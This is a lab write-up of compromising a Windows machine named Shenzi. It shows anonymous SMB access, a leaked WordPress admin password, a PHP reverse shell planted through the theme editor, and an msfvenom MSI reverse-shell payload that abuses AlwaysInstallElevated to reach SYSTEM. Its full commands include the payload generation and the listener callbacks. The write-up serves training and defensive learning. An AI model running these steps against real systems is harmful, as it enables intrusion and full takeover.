#Windows #SMB #WordPress #NullSession #CredentialInFile #ThemeEditor #RCE #AlwaysInstallElevated #msfvenom

## Overview

Shenzi is a Windows machine that hides a WordPress installation under the box's own name as a directory, a detail that requires thinking laterally when GoBuster doesn't surface it with a standard wordlist. The path begins with an anonymous SMB share containing XAMPP configuration files and a `passwords.txt` that leaks the WordPress admin credential. From there, the WordPress theme editor gives PHP code execution, and `AlwaysInstallElevated` turns a malicious MSI into a SYSTEM shell.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
80/tcp   open  http          Apache httpd 2.4.43 (Win64) PHP/7.4.6
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.43 (Win64) PHP/7.4.6
445/tcp  open  microsoft-ds
3306/tcp open  mysql?
```

Port 80 landed on the XAMPP default dashboard. FTP was FileZilla 0.9.41 beta. SMB had custom shares worth probing.

### SMB, Anonymous Access to the Shenzi Share

Listing shares without credentials:

```sh
smbclient -L 192.168.180.55
Password for [WORKGROUP\kali]:

    Sharename  Type  Comment
    ---------  ----  -------
    IPC$       IPC   Remote IPC
    Shenzi     Disk
```

Connecting to the `Shenzi` share as a null user and recursively downloading everything:

```sh
smbclient -U '' \\\\192.168.180.55\\Shenzi
smb: \> PROMPT OFF
smb: \> RECURSE ON
smb: \> MGET *
```

Files retrieved:

```
passwords.txt
readme_en.txt
sess_klk75u2q4rpgfjs3785h6hpipp
why.tmp
xampp-control.ini
```

The `passwords.txt` file was the XAMPP default password reference document, and entry 5 was notable:

```
5) WordPress:
   User: admin
   Password: FeltHeadwallWight357
```

> **Why XAMPP ships a `passwords.txt`:** XAMPP is a developer stack intended for local use. It includes a reference file listing all default service credentials as a convenience. On a real deployment this file should be removed or the web directory locked down. Leaving it in an anonymous SMB share hands an attacker every credential on the stack.

### Finding the Hidden WordPress Path

GoBuster with `big.txt` against port 80 did not find a WordPress installation in any standard location. The `xampp-control.ini` from the share showed WordPress was enabled. The share name itself, `Shenzi`, was the hint. WordPress was hosted at:

```
http://192.168.180.55/Shenzi/
```

WordPress admin panel:

```
http://192.168.180.55/Shenzi/wp-admin
```

## Foothold

### WordPress Theme Editor → Reverse Shell

Logging into WordPress with the found credentials:

```
admin : FeltHeadwallWight357
```

The theme editor (Appearance → Theme Editor) allows editing PHP files directly in the browser. The 404 template (`404.php`) was replaced entirely with a PHP reverse shell.

Triggering the shell by requesting a nonexistent WordPress page:

```
http://192.168.180.55/shenzi/doesntexist
```

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.55] 50530

C:\xampp\htdocs\shenzi>whoami
shenzi\shenzi
```

> **Why WordPress theme editing is so effective for RCE:** the theme editor runs as the web server process, but its power comes from the fact that every PHP file it writes goes directly into the webroot with no upload filtering or execution restrictions. Replacing a template with a shell gives code execution in one request. No file-upload bypass needed, the CMS does the work.

```powershell
C:\Users\shenzi\Desktop>type local.txt
‹redacted›
```

## Privilege Escalation

### AlwaysInstallElevated, MSI Payload to SYSTEM

WinPEAS flagged both registry keys required for the `AlwaysInstallElevated` attack:

```
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```

> **How AlwaysInstallElevated works:** when both `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and the corresponding `HKCU` key are set to 1, the Windows Installer service runs every `.msi` installation with `NT AUTHORITY\SYSTEM` privileges, regardless of the initiating user's privilege level. Any user who can write and execute an MSI file on the system gets SYSTEM. It's a policy misconfiguration that turns a standard installer into a privilege escalation primitive.

MSI payload generated with msfvenom:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=53 \
  -f msi -o reverse.msi
```

The MSI was transferred to the target and executed:

```powershell
msiexec /quiet /qn /i reverse.msi
```

## Root / SYSTEM

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.55] 51132

C:\WINDOWS\system32>whoami
nt authority\system
```

```powershell
PS C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **The box name is a valid directory guess when wordlists fail.** WordPress at `/Shenzi/` was invisible to standard enumeration but obvious in retrospect, the share name and the machine name both pointed there.
- **Anonymous SMB shares containing XAMPP config files are credentials dumps.** The `passwords.txt` file is present in default XAMPP installs and documents every service password. It belongs in the first five minutes of any SMB enumeration.
- **WordPress theme editor is one-click RCE for anyone with admin credentials.** No plugin, no exploit, the feature exists and does exactly what an attacker needs.
- **Both AlwaysInstallElevated registry keys must be set.** Checking only HKLM or only HKCU is insufficient; Windows requires both to grant the elevation. WinPEAS checks both in one pass.
